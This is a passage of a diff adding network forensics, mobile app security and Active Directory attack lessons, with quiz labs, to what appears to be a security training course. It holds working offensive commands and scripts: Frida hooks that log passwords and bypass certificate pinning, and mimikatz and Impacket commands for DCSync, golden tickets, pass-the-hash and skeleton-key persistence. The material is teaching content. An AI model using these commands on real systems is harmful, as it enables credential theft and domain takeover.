@@ -2921,6 +2921,2250 @@ except Exception as e:
           }
         }
       ]
+    },
+    // ============ NEW: NETWORK FORENSICS ============
+    {
+      id: 'network-forensics',
+      title: 'Network Forensics',
+      description: 'Packet analysis, traffic reconstruction, and network evidence collection',
+      icon: Wifi,
+      color: 'text-teal-500',
+      bgGradient: 'from-teal-500/20 to-cyan-500/20',
+      completed: false,
+      category: 'defensive',
+      estimatedTime: '5 hours',
+      lessons: [
+        {
+          id: 'netforensics-1',
+          title: 'Wireshark Deep Dive',
+          completed: false,
+          keyPoints: [
+            'Capture filter vs display filter',
+            'Protocol dissection',
+            'Follow TCP/UDP streams',
+            'Export objects from captures'
+          ],
+          content: `WIRESHARK PACKET ANALYSIS
+
+CAPTURE FILTERS (BPF):
+• host 192.168.1.1
+• port 80 or port 443
+• net 10.0.0.0/8
+• tcp and port 22
+
+DISPLAY FILTERS:
+• ip.addr == 192.168.1.1
+• tcp.port == 80
+• http.request.method == "POST"
+• dns.qry.name contains "malware"
+• tcp.flags.syn == 1 && tcp.flags.ack == 0
+• http.response.code >= 400
+
+USEFUL TECHNIQUES:
+1. Statistics → Conversations (identify top talkers)
+2. Statistics → Protocol Hierarchy
+3. Follow → TCP Stream (reassemble sessions)
+4. File → Export Objects → HTTP (extract files)
+5. Analyze → Expert Information
+
+DETECTING ATTACKS:
+• Port scan: Many SYN to different ports
+• DNS tunnel: Large TXT records, odd domains
+• C2: Beaconing patterns
+• Exfiltration: Large outbound transfers`,
+          codeExample: `# TShark Command Line Analysis
+# Capture live traffic
+tshark -i eth0 -w capture.pcap
+
+# Read and filter
+tshark -r capture.pcap -Y "http.request.method == POST"
+
+# Extract HTTP URIs
+tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
+
+# DNS queries
+tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name
+
+# Find beaconing (time delta analysis)
+tshark -r capture.pcap -Y "ip.dst == 10.10.10.10" -T fields -e frame.time_relative
+
+# Python: Scapy Packet Analysis
+from scapy.all import rdpcap, TCP, DNS
+
+def analyze_pcap(file_path):
+    packets = rdpcap(file_path)
+    
+    stats = {
+        'total': len(packets),
+        'tcp': 0,
+        'dns_queries': [],
+        'http_hosts': set()
+    }
+    
+    for pkt in packets:
+        if TCP in pkt:
+            stats['tcp'] += 1
+            
+        if DNS in pkt and pkt.haslayer(DNS):
+            if pkt[DNS].qr == 0:  # Query
+                stats['dns_queries'].append(pkt[DNS].qd.qname.decode())
+    
+    return stats`,
+          liveLab: {
+            id: 'lab-wireshark',
+            title: 'Wireshark Filter Challenge',
+            description: 'Write effective display filters',
+            difficulty: 'intermediate',
+            challenge: 'Write a Wireshark display filter to find: HTTP POST requests to any domain containing "login" in the URI path.',
+            hint: 'Combine http.request.method with http.request.uri and use "contains"...',
+            solution: 'http.request.method == "POST" && http.request.uri contains "login"',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return lower.includes('post') && lower.includes('login') && (lower.includes('contains') || lower.includes('matches'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['Wireshark', 'Packet analysis', 'Network forensics']
+          }
+        },
+        {
+          id: 'netforensics-2',
+          title: 'C2 Traffic Detection',
+          completed: false,
+          keyPoints: [
+            'Beaconing pattern analysis',
+            'DNS tunneling detection',
+            'HTTPS inspection challenges',
+            'JA3/JA3S fingerprinting'
+          ],
+          content: `COMMAND & CONTROL TRAFFIC DETECTION
+
+BEACONING INDICATORS:
+• Regular time intervals
+• Consistent payload sizes
+• Low data volume
+• Unusual ports/protocols
+• Self-signed certificates
+
+DETECTION TECHNIQUES:
+
+1. TIME-BASED ANALYSIS
+   Calculate inter-arrival times
+   Low jitter = automated beaconing
+   
+2. DNS TUNNELING
+   • Long subdomain names
+   • High query frequency
+   • TXT record responses
+   • Entropy analysis
+   
+3. HTTPS ANOMALIES
+   • JA3 fingerprint matching
+   • Certificate validation
+   • SNI vs certificate CN mismatch
+   
+4. STATISTICAL ANALYSIS
+   • Bytes in vs bytes out ratio
+   • Session duration
+   • Connection frequency
+
+JA3 FINGERPRINTING:
+Hash of: TLS Version, Ciphers, Extensions, Curves, Point formats
+Unique per client application!`,
+          codeExample: `# Beaconing Detection with Python
+import pandas as pd
+import numpy as np
+from collections import defaultdict
+
+def detect_beaconing(connections):
+    """Detect potential C2 beaconing patterns"""
+    
+    beacons = []
+    
+    # Group by destination
+    by_dest = defaultdict(list)
+    for conn in connections:
+        by_dest[conn['dst_ip']].append(conn['timestamp'])
+    
+    for dst_ip, timestamps in by_dest.items():
+        if len(timestamps) < 10:
+            continue
+            
+        # Calculate inter-arrival times
+        times = sorted(timestamps)
+        deltas = [times[i+1] - times[i] for i in range(len(times)-1)]
+        
+        mean_delta = np.mean(deltas)
+        std_delta = np.std(deltas)
+        
+        # Low standard deviation = consistent beaconing
+        if std_delta < mean_delta * 0.1:  # Less than 10% jitter
+            beacons.append({
+                'dst_ip': dst_ip,
+                'interval': mean_delta,
+                'jitter': std_delta,
+                'count': len(timestamps),
+                'confidence': 'HIGH' if std_delta < mean_delta * 0.05 else 'MEDIUM'
+            })
+    
+    return beacons
+
+# DNS Tunneling Detection
+def detect_dns_tunnel(dns_queries):
+    """Detect potential DNS tunneling"""
+    
+    suspicious = []
+    
+    for query in dns_queries:
+        domain = query['domain']
+        subdomain = domain.split('.')[0]
+        
+        # Calculate entropy
+        entropy = calculate_entropy(subdomain)
+        
+        if len(subdomain) > 30 and entropy > 3.5:
+            suspicious.append({
+                'domain': domain,
+                'length': len(subdomain),
+                'entropy': entropy,
+                'reason': 'High entropy long subdomain'
+            })
+    
+    return suspicious`,
+          liveLab: {
+            id: 'lab-c2-detect',
+            title: 'C2 Beacon Analysis',
+            description: 'Identify malicious traffic patterns',
+            difficulty: 'advanced',
+            challenge: 'Traffic shows connections to 45.33.32.156 every 60 seconds (±2sec) with 156 bytes each time. What THREE indicators suggest C2 beaconing?',
+            hint: 'Consider regularity, consistency, and data patterns...',
+            solution: '1. Regular interval (~60s), 2. Low jitter (±2s), 3. Consistent payload size (156 bytes)',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('interval') || lower.includes('regular') || lower.includes('60')) &&
+                     (lower.includes('jitter') || lower.includes('consistent') || lower.includes('size'));
+            },
+            completed: false,
+            points: 100,
+            timeEstimate: '20 min',
+            skills: ['C2 detection', 'Network analysis', 'Threat hunting']
+          }
+        },
+        {
+          id: 'netforensics-3',
+          title: 'Traffic Reconstruction',
+          completed: false,
+          keyPoints: [
+            'Session reconstruction',
+            'File carving from packets',
+            'Email extraction',
+            'VoIP call recovery'
+          ],
+          content: `NETWORK TRAFFIC RECONSTRUCTION
+
+SESSION REASSEMBLY:
+• TCP stream following
+• HTTP object export
+• SMB file extraction
+• Email message recovery
+
+TECHNIQUES:
+
+1. FILE CARVING
+   Extract files from packet data:
+   • Images (JPEG, PNG, GIF)
+   • Documents (PDF, DOCX)
+   • Executables (PE, ELF)
+   • Archives (ZIP, RAR)
+
+2. EMAIL RECOVERY
+   • SMTP traffic analysis
+   • POP3/IMAP extraction
+   • Attachment recovery
+   • Header analysis for origin
+
+3. CREDENTIAL CAPTURE
+   • HTTP Basic Auth (Base64)
+   • Form-based login data
+   • FTP credentials
+   • Telnet sessions
+
+4. VoIP ANALYSIS
+   • RTP stream extraction
+   • SIP session parsing
+   • Call metadata recovery
+   • Audio playback
+
+TOOLS:
+• NetworkMiner (automatic extraction)
+• Xplico (session reconstruction)
+• Foremost (file carving)
+• tcpflow (stream extraction)`,
+          codeExample: `# NetworkMiner CLI alternative with Python
+from scapy.all import rdpcap, TCP, Raw
+import re
+
+def extract_http_objects(pcap_file):
+    """Extract HTTP objects from pcap"""
+    
+    packets = rdpcap(pcap_file)
+    objects = []
+    
+    # Reassemble TCP streams
+    streams = {}
+    for pkt in packets:
+        if TCP in pkt and Raw in pkt:
+            key = (pkt[TCP].sport, pkt[TCP].dport)
+            if key not in streams:
+                streams[key] = b''
+            streams[key] += bytes(pkt[Raw])
+    
+    # Find HTTP responses with content
+    for stream_id, data in streams.items():
+        if b'HTTP/' in data and b'Content-Type:' in data:
+            # Extract content type
+            ct_match = re.search(b'Content-Type: ([^\\r\\n]+)', data)
+            if ct_match:
+                content_type = ct_match.group(1).decode()
+                
+                # Find body (after double CRLF)
+                body_start = data.find(b'\\r\\n\\r\\n') + 4
+                if body_start > 4:
+                    body = data[body_start:]
+                    objects.append({
+                        'stream': stream_id,
+                        'content_type': content_type,
+                        'size': len(body),
+                        'data': body[:1000]  # First 1KB
+                    })
+    
+    return objects
+
+# Credential extraction
+def extract_credentials(pcap_file):
+    """Extract credentials from unencrypted traffic"""
+    
+    creds = []
+    packets = rdpcap(pcap_file)
+    
+    for pkt in packets:
+        if TCP in pkt and Raw in pkt:
+            payload = bytes(pkt[Raw])
+            
+            # HTTP Basic Auth
+            if b'Authorization: Basic' in payload:
+                match = re.search(b'Basic ([A-Za-z0-9+/=]+)', payload)
+                if match:
+                    import base64
+                    decoded = base64.b64decode(match.group(1))
+                    creds.append({'type': 'HTTP Basic', 'value': decoded.decode()})
+            
+            # FTP credentials
+            if pkt[TCP].dport == 21:
+                if b'USER ' in payload or b'PASS ' in payload:
+                    creds.append({'type': 'FTP', 'value': payload.decode(errors='ignore')})
+    
+    return creds`
+        }
+      ]
+    },
+    // ============ NEW: MOBILE SECURITY ============
+    {
+      id: 'mobile-security',
+      title: 'Mobile Application Security',
+      description: 'Android and iOS security testing, reverse engineering mobile apps',
+      icon: Phone,
+      color: 'text-emerald-500',
+      bgGradient: 'from-emerald-500/20 to-green-500/20',
+      completed: false,
+      category: 'offensive',
+      estimatedTime: '7 hours',
+      lessons: [
+        {
+          id: 'mobile-1',
+          title: 'Android Application Analysis',
+          completed: false,
+          keyPoints: [
+            'APK structure and decompilation',
+            'Manifest analysis',
+            'Code review techniques',
+            'Dynamic analysis with Frida'
+          ],
+          content: `ANDROID SECURITY ANALYSIS
+
+APK STRUCTURE:
+├── AndroidManifest.xml (permissions, components)
+├── classes.dex (compiled Java/Kotlin code)
+├── res/ (resources, layouts)
+├── lib/ (native libraries)
+├── assets/ (raw files)
+└── META-INF/ (signatures)
+
+STATIC ANALYSIS:
+
+1. DECOMPILATION
+   • jadx: DEX → Java source
+   • apktool: Resource extraction
+   • dex2jar: DEX → JAR
+
+2. MANIFEST ANALYSIS
+   • Exported components (activities, services)
+   • Permission requests
+   • Deep link handlers
+   • Backup enabled?
+
+3. CODE REVIEW
+   • Hardcoded secrets/API keys
+   • Insecure storage
+   • SQL injection in ContentProviders
+   • Weak cryptography
+
+DYNAMIC ANALYSIS:
+
+1. FRIDA (Runtime manipulation)
+   • Hook functions
+   • Bypass root detection
+   • Extract runtime secrets
+   
+2. PROXY INTERCEPTION
+   • Burp Suite + certificate pinning bypass
+   • Traffic analysis
+
+COMMON VULNERABILITIES:
+• Insecure data storage
+• Hardcoded credentials
+• Exported components without protection
+• Missing certificate pinning
+• WebView vulnerabilities`,
+          codeExample: `# Android Analysis Commands
+
+# Decompile APK with jadx
+jadx -d output_dir app.apk
+
+# Extract with apktool
+apktool d app.apk -o output_dir
+
+# Search for hardcoded secrets
+grep -rn "api_key\\|secret\\|password\\|token" output_dir/
+
+# Check exported components
+grep -E "android:exported=\"true\"" AndroidManifest.xml
+
+# Frida Script: Hook function
+// hook.js
+Java.perform(function() {
+    var MainActivity = Java.use("com.example.app.MainActivity");
+    
+    // Hook login method
+    MainActivity.login.implementation = function(username, password) {
+        console.log("Username: " + username);
+        console.log("Password: " + password);
+        
+        // Call original method
+        return this.login(username, password);
+    };
+    
+    // Bypass root detection
+    var RootCheck = Java.use("com.example.app.RootChecker");
+    RootCheck.isRooted.implementation = function() {
+        console.log("Root check bypassed!");
+        return false;
+    };
+});
+
+# Run Frida
+frida -U -l hook.js com.example.app
+
+# Certificate Pinning Bypass (Frida)
+Java.perform(function() {
+    var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
+    var SSLContext = Java.use('javax.net.ssl.SSLContext');
+    
+    // Custom TrustManager that trusts all certs
+    var TrustAllCerts = Java.registerClass({
+        name: 'com.bypass.TrustAllCerts',
+        implements: [TrustManager],
+        methods: {
+            checkClientTrusted: function(chain, authType) {},
+            checkServerTrusted: function(chain, authType) {},
+            getAcceptedIssuers: function() { return []; }
+        }
+    });
+});`,
+          liveLab: {
+            id: 'lab-android',
+            title: 'APK Security Audit',
+            description: 'Identify Android app vulnerabilities',
+            difficulty: 'intermediate',
+            challenge: 'AndroidManifest.xml shows: <activity android:name=".AdminActivity" android:exported="true"/>. What attack is possible and why?',
+            hint: 'Exported activities can be started by any app on the device...',
+            solution: 'Unauthorized access - any app can start AdminActivity directly bypassing authentication',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('unauthorized') || lower.includes('bypass') || lower.includes('direct')) &&
+                     (lower.includes('access') || lower.includes('start') || lower.includes('launch'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['Android security', 'Mobile pentesting', 'Reverse engineering']
+          }
+        },
+        {
+          id: 'mobile-2',
+          title: 'iOS Security Testing',
+          completed: false,
+          keyPoints: [
+            'IPA structure analysis',
+            'Binary analysis with Hopper',
+            'Keychain data extraction',
+            'Runtime manipulation with Cycript'
+          ],
+          content: `iOS SECURITY TESTING
+
+IPA STRUCTURE:
+├── Payload/
+│   └── AppName.app/
+│       ├── AppName (Mach-O binary)
+│       ├── Info.plist
+│       ├── embedded.mobileprovision
+│       └── Resources/
+└── iTunesArtwork
+
+STATIC ANALYSIS:
+
+1. BINARY ANALYSIS
+   • class-dump (Objective-C headers)
+   • Hopper/IDA (disassembly)
+   • otool (dependencies, segments)
+
+2. PLIST ANALYSIS
+   • URL schemes
+   • App Transport Security settings
+   • Entitlements
+
+3. STRING EXTRACTION
+   • Hardcoded URLs/keys
+   • Debug messages
+
+DYNAMIC ANALYSIS:
+
+1. OBJECTION (Frida-based)
+   • iOS runtime exploration
+   • Keychain dumping
+   • Jailbreak bypass
+
+2. CYCRIPT
+   • JavaScript REPL
+   • Method hooking
+   • UI manipulation
+
+COMMON VULNERABILITIES:
+• Insecure local storage
+• Weak ATS configuration
+• Missing jailbreak detection
+• Clipboard data leakage
+• Sensitive data in logs`,
+          codeExample: `# iOS Analysis Commands
+
+# Extract IPA
+unzip app.ipa -d extracted/
+
+# Dump classes from binary
+class-dump -H AppName -o headers/
+
+# Check security features
+otool -l AppName | grep -A4 LC_ENCRYPTION
+# 0 = not encrypted, easy to analyze
+
+# Check linked frameworks
+otool -L AppName
+
+# Objection: Explore iOS app
+objection -g com.example.app explore
+
+# Inside objection:
+ios keychain dump
+ios plist cat Info.plist
+ios hooking list classes
+ios hooking watch method "-[LoginViewController login:]" --dump-args
+
+# Frida iOS Script
+Java.perform(function() {
+    // Hook Objective-C method
+    var className = "LoginViewController";
+    var methodName = "- validateCredentials:password:";
+    
+    var hook = ObjC.classes[className][methodName];
+    Interceptor.attach(hook.implementation, {
+        onEnter: function(args) {
+            console.log("Username: " + ObjC.Object(args[2]));
+            console.log("Password: " + ObjC.Object(args[3]));
+        },
+        onLeave: function(retval) {
+            console.log("Result: " + retval);
+            // Force return true
+            retval.replace(1);
+        }
+    });
+});
+
+# Bypass Jailbreak Detection
+ObjC.classes.JailbreakDetector.isJailbroken.implementation = function() {
+    return false;
+};`,
+          liveLab: {
+            id: 'lab-ios',
+            title: 'iOS Security Check',
+            description: 'Evaluate iOS app security',
+            difficulty: 'advanced',
+            challenge: 'Info.plist shows NSAllowsArbitraryLoads = YES under NSAppTransportSecurity. What security risk does this introduce?',
+            hint: 'This setting affects how the app communicates over the network...',
+            solution: 'Allows HTTP connections (no HTTPS required), enabling MITM attacks',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('http') || lower.includes('unencrypted') || lower.includes('plain')) &&
+                     (lower.includes('mitm') || lower.includes('intercept') || lower.includes('man-in-the-middle'));
+            },
+            completed: false,
+            points: 100,
+            timeEstimate: '20 min',
+            skills: ['iOS security', 'Mobile pentesting', 'ATS bypass']
+          }
+        },
+        {
+          id: 'mobile-3',
+          title: 'API Security Testing',
+          completed: false,
+          keyPoints: [
+            'Intercepting mobile API traffic',
+            'Authentication bypass techniques',
+            'IDOR in mobile APIs',
+            'Rate limiting and abuse'
+          ],
+          content: `MOBILE API SECURITY TESTING
+
+INTERCEPTION SETUP:
+1. Configure proxy (Burp/mitmproxy)
+2. Install CA certificate on device
+3. Bypass certificate pinning
+4. Capture and modify requests
+
+COMMON API VULNERABILITIES:
+
+1. BROKEN AUTHENTICATION
+   • Weak JWT implementation
+   • Token leakage
+   • Missing token expiration
+   • Predictable tokens
+
+2. IDOR (Insecure Direct Object Reference)
+   • /api/users/123 → change to 124
+   • UUID enumeration
+   • Sequential IDs
+
+3. MASS ASSIGNMENT
+   POST /api/profile
+   {"name": "Hacker", "role": "admin"}
+
+4. RATE LIMITING ISSUES
+   • Brute force possible
+   • No exponential backoff
+   • Missing CAPTCHA
+
+5. DATA EXPOSURE
+   • Verbose error messages
+   • Debug endpoints in production
+   • Sensitive data in responses
+
+TESTING CHECKLIST:
+□ Test with expired tokens
+□ Modify user IDs in requests
+□ Add extra parameters
+□ Check for hidden endpoints
+□ Test rate limits
+□ Verify input validation`,
+          codeExample: `# mitmproxy Script for API Analysis
+from mitmproxy import http
+
+def request(flow: http.HTTPFlow):
+    # Log all API requests
+    if "api" in flow.request.pretty_url:
+        print(f"[{flow.request.method}] {flow.request.pretty_url}")
+        
+        # Check for sensitive headers
+        auth = flow.request.headers.get("Authorization", "")
+        if auth:
+            print(f"  Auth: {auth[:50]}...")
+        
+        # Log POST body
+        if flow.request.method == "POST":
+            print(f"  Body: {flow.request.text[:200]}")
+
+def response(flow: http.HTTPFlow):
+    # Check for sensitive data in responses
+    if "api" in flow.request.pretty_url:
+        body = flow.response.text
+        
+        # Look for exposed sensitive data
+        sensitive = ['password', 'secret', 'api_key', 'token', 'ssn']
+        for word in sensitive:
+            if word.lower() in body.lower():
+                print(f"[!] Sensitive data '{word}' in response!")
+
+# Python: IDOR Testing
+import requests
+
+def test_idor(base_url, auth_token, id_range):
+    """Test for IDOR vulnerabilities"""
+    
+    results = []
+    headers = {"Authorization": f"Bearer {auth_token}"}
+    
+    for user_id in id_range:
+        url = f"{base_url}/api/users/{user_id}"
+        response = requests.get(url, headers=headers)
+        
+        if response.status_code == 200:
+            data = response.json()
+            results.append({
+                'id': user_id,
+                'accessible': True,
+                'data': data
+            })
+            print(f"[!] IDOR: Accessed user {user_id}")
+    
+    return results
+
+# Test
+test_idor("https://api.example.com", "my_token", range(1, 100))`,
+          liveLab: {
+            id: 'lab-api-security',
+            title: 'API Vulnerability Hunt',
+            description: 'Find mobile API security issues',
+            difficulty: 'intermediate',
+            challenge: 'Mobile app sends: GET /api/orders/12345. You change to /api/orders/12346 and see another users order. What vulnerability is this and how should it be fixed?',
+            hint: 'The server is not validating ownership of the resource...',
+            solution: 'IDOR vulnerability - fix by checking that the authenticated user owns the requested order',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('idor') || lower.includes('insecure direct')) &&
+                     (lower.includes('check') || lower.includes('verify') || lower.includes('validate') || lower.includes('owner'));
+            },
+            completed: false,
+            points: 75,
+            timeEstimate: '15 min',
+            skills: ['API security', 'IDOR testing', 'Authorization flaws']
+          }
+        }
+      ]
+    },
+    // ============ NEW: ACTIVE DIRECTORY SECURITY ============
+    {
+      id: 'active-directory',
+      title: 'Active Directory Attacks',
+      description: 'AD enumeration, Kerberos attacks, privilege escalation in Windows domains',
+      icon: Server,
+      color: 'text-blue-500',
+      bgGradient: 'from-blue-500/20 to-indigo-500/20',
+      completed: false,
+      category: 'offensive',
+      estimatedTime: '8 hours',
+      prerequisites: ['network-attacks'],
+      lessons: [
+        {
+          id: 'ad-1',
+          title: 'AD Enumeration',
+          completed: false,
+          keyPoints: [
+            'LDAP queries and BloodHound',
+            'User and group enumeration',
+            'Trust relationships',
+            'ACL analysis'
+          ],
+          content: `ACTIVE DIRECTORY ENUMERATION
+
+INITIAL FOOTHOLD:
+Once on domain-joined machine, enumerate everything!
+
+TOOLS:
+• BloodHound (graph-based analysis)
+• PowerView (PowerShell)
+• ldapsearch (Linux)
+• ADExplorer (GUI)
+
+KEY INFORMATION:
+1. Domain Controllers
+2. Domain Admins
+3. Service accounts
+4. Trust relationships
+5. Group policies
+6. Interesting ACLs
+
+POWERVIEW COMMANDS:
+Get-DomainUser
+Get-DomainGroup -MemberIdentity "Domain Admins"
+Get-DomainComputer -Properties name,operatingsystem
+Get-DomainTrust
+Find-LocalAdminAccess
+Get-DomainGPO
+
+BLOODHOUND COLLECTION:
+SharpHound.exe -c All
+# Collects: Users, Groups, Sessions, ACLs, Trusts
+
+KEY PATHS TO DOMAIN ADMIN:
+• Kerberoasting
+• Pass-the-Hash
+• Token impersonation
+• ACL abuse
+• GPO abuse`,
+          codeExample: `# PowerView Enumeration Commands
+Import-Module PowerView.ps1
+
+# Get all users
+Get-DomainUser | Select samaccountname, description
+
+# Find users with SPNs (Kerberoastable)
+Get-DomainUser -SPN
+
+# Get Domain Admins
+Get-DomainGroupMember -Identity "Domain Admins"
+
+# Find where current user has admin access
+Find-LocalAdminAccess
+
+# Get computers with unconstrained delegation
+Get-DomainComputer -Unconstrained
+
+# ACL Analysis - who can DCSync?
+Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs | 
+    ? { $_.ObjectAceType -match "replication" }
+
+# ldapsearch from Linux
+ldapsearch -x -H ldap://dc.corp.local -D "user@corp.local" -W \\
+    -b "DC=corp,DC=local" "(objectClass=user)" samaccountname description
+
+# BloodHound data collection
+./SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\\temp\\
+# Upload resulting JSON to BloodHound
+
+# Cypher Queries in BloodHound
+# Shortest path to Domain Admin
+MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
+RETURN p
+
+# Find Kerberoastable users
+MATCH (u:User {hasspn:true}) RETURN u`,
+          liveLab: {
+            id: 'lab-ad-enum',
+            title: 'AD Attack Path',
+            description: 'Identify privilege escalation path',
+            difficulty: 'advanced',
+            challenge: 'BloodHound shows: User "svc_backup" has GenericAll on "Domain Admins" group. What attack can you perform?',
+            hint: 'GenericAll means full control over the object...',
+            solution: 'Add yourself to Domain Admins group using the GenericAll permission',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return (lower.includes('add') || lower.includes('modify') || lower.includes('change')) &&
+                     (lower.includes('domain admin') || lower.includes('group') || lower.includes('member'));
+            },
+            completed: false,
+            points: 100,
+            timeEstimate: '20 min',
+            skills: ['Active Directory', 'BloodHound', 'Privilege escalation']
+          }
+        },
+        {
+          id: 'ad-2',
+          title: 'Kerberos Attacks',
+          completed: false,
+          keyPoints: [
+            'Kerberoasting technique',
+            'AS-REP Roasting',
+            'Golden/Silver tickets',
+            'Pass-the-Ticket attacks'
+          ],
+          content: `KERBEROS ATTACK TECHNIQUES
+
+KERBEROS BASICS:
+1. User requests TGT from KDC (AS-REQ)
+2. KDC returns TGT encrypted with krbtgt hash (AS-REP)
+3. User requests service ticket (TGS-REQ)
+4. KDC returns ST encrypted with service hash (TGS-REP)
+5. User presents ST to service
+
+KERBEROASTING:
+• Request service tickets for accounts with SPNs
+• Tickets encrypted with service account password
+• Crack offline!
+
+Requirements: Any domain user
+Target: Service accounts with SPNs
+
+AS-REP ROASTING:
+• Target accounts with "Do not require pre-auth"
+• Request AS-REP without password
+• Crack the response
+
+GOLDEN TICKET:
+• Forged TGT using krbtgt hash
+• Grants access to ANY service
+• Survives password resets!
+
+Requirements: krbtgt hash (Domain Admin needed first)
+
+SILVER TICKET:
+• Forged service ticket
+• Only grants access to specific service
+• Doesn't touch DC
+
+Requirements: Service account hash`,
+          codeExample: `# Kerberoasting with Rubeus
+.\\Rubeus.exe kerberoast /outfile:hashes.txt
+
+# With Impacket
+GetUserSPNs.py corp.local/user:password -dc-ip 192.168.1.10 -request
+
+# Crack the hash
+hashcat -m 13100 hashes.txt wordlist.txt
+
+# AS-REP Roasting
+# Find vulnerable users
+Get-DomainUser -PreauthNotRequired
+
+# Request AS-REP
+.\\Rubeus.exe asreproast /outfile:asrep.txt
+
+# With Impacket
+GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 192.168.1.10
+
+# Golden Ticket (requires krbtgt hash)
+# Get krbtgt hash first via DCSync
+mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+
+# Create golden ticket
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local \\
+    /sid:S-1-5-21-... /krbtgt:NTLM_HASH /ptt
+
+# Silver Ticket (for a service)
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local \\
+    /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc \\
+    /rc4:SERVICE_HASH /ptt
+
+# Pass-the-Ticket
+mimikatz # sekurlsa::tickets /export
+mimikatz # kerberos::ptt ticket.kirbi`,
+          liveLab: {
+            id: 'lab-kerberoast',
+            title: 'Kerberoasting Analysis',
+            description: 'Understand Kerberos attack requirements',
+            difficulty: 'advanced',
+            challenge: 'You have a low-privileged domain user account. Which Kerberos attack can you perform with just these credentials, and what do you target?',
+            hint: 'One attack only needs ANY valid domain credentials to request something...',
+            solution: 'Kerberoasting - target service accounts with SPNs to get crackable tickets',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return lower.includes('kerberoast') && (lower.includes('spn') || lower.includes('service'));
+            },
+            completed: false,
+            points: 100,
+            timeEstimate: '25 min',
+            skills: ['Kerberos', 'Active Directory', 'Credential attacks']
+          }
+        },
+        {
+          id: 'ad-3',
+          title: 'Lateral Movement & Persistence',
+          completed: false,
+          keyPoints: [
+            'Pass-the-Hash attacks',
+            'Overpass-the-Hash',
+            'DCSync attack',
+            'Skeleton Key persistence'
+          ],
+          content: `LATERAL MOVEMENT IN AD
+
+PASS-THE-HASH:
+Use NTLM hash instead of password
+• Works with local admin hash
+• No need to crack!
+
+OVERPASS-THE-HASH:
+Convert NTLM hash to Kerberos ticket
+• Stealthier than PtH
+• Blends with normal auth
+
+PASS-THE-TICKET:
+Steal and reuse existing Kerberos tickets
+• From memory with mimikatz
+• Golden/Silver ticket injection
+
+DCSYNC ATTACK:
+Simulate Domain Controller replication
+• Get ANY user's hash
+• Including krbtgt!
+
+Requirements: Replication rights (Domain Admin)
+
+PERSISTENCE TECHNIQUES:
+
+1. SKELETON KEY
+   • Master password for any account
+   • Requires DC access
+
+2. GOLDEN TICKET
+   • Forge tickets forever
+   • Survives password changes
+
+3. ACL ABUSE
+   • Add hidden permissions
+   • Harder to detect
+
+4. SHADOW ADMIN
+   • Add to privileged groups
+   • Nested group membership`,
+          codeExample: `# Pass-the-Hash with Mimikatz
+mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \\
+    /ntlm:HASH /run:cmd.exe
+
+# Or with Impacket
+psexec.py -hashes :NTLM_HASH Administrator@192.168.1.10
+
+# Overpass-the-Hash (get Kerberos ticket from hash)
+mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \\
+    /ntlm:HASH /run:"powershell -ep bypass"
+
+# Then request ticket
+klist  # Shows TGT obtained
+
+# DCSync Attack (need Replication rights)
+mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+
+# With Impacket
+secretsdump.py corp.local/admin:password@dc.corp.local -just-dc
+
+# Skeleton Key (inject backdoor password)
+mimikatz # misc::skeleton
+# Now "mimikatz" works as password for any user!
+
+# Shadow Admin - Hidden group membership
+Add-DomainGroupMember -Identity "Backup Operators" -Members hacker
+# Many forget to audit Backup Operators, Server Operators, etc.
+
+# DCSync persistence - add replication rights
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \\
+    -PrincipalIdentity hacker \\
+    -Rights DCSync`,
+          liveLab: {
+            id: 'lab-dcsync',
+            title: 'DCSync Requirements',
+            description: 'Understand DCSync attack',
+            difficulty: 'expert',
+            challenge: 'You want to perform DCSync to dump all domain hashes. What specific Active Directory permissions (rights) are required?',
+            hint: 'DCSync simulates domain controller replication...',
+            solution: 'Replicating Directory Changes + Replicating Directory Changes All (DS-Replication-Get-Changes)',
+            validator: (input: string) => {
+              const lower = input.toLowerCase();
+              return lower.includes('replicat') && (lower.includes('change') || lower.includes('sync') || lower.includes('directory'));
+            },
+            completed: false,
+            points: 125,
+            timeEstimate: '25 min',
+            skills: ['DCSync', 'Active Directory', 'Persistence']
+          }
+        }
+      ]
+    },
+    // ============ NEW: SECURE CODING ============
+    {
+      id: 'secure-coding',
+      title: 'Secure Coding Practices',
+      description: 'Write secure code, prevent common vulnerabilities, code review techniques',
+      icon: FileCode,
+      color: 'text-lime-500',
+      bgGradient: 'from-lime-500/20 to-green-500/20',
+      completed: false,
+      category: 'fundamentals',
+      estimatedTime: '6 hours',
+      lessons: [
+        {
+          id: 'secure-1',
+          title: 'Input Validation & Sanitization',
+          completed: false,
+          keyPoints: [
+            'Whitelist vs blacklist validation',
+            'Context-aware output encoding',
+            'Parameter binding',
+            'File upload security'
+          ],
+          content: `INPUT VALIDATION BEST PRACTICES
+
+VALIDATION PRINCIPLES:
+1. Validate on SERVER side (never trust client)
+2. Use WHITELIST approach (allow known good)
+3. Validate type, length, format, range
+4. Encode output based on context
+
+WHITELIST VS BLACKLIST:
+✓ Whitelist: Only allow [a-zA-Z0-9]
+✗ Blacklist: Block <script> (bypassed easily)
+
+CONTEXT-AWARE ENCODING:
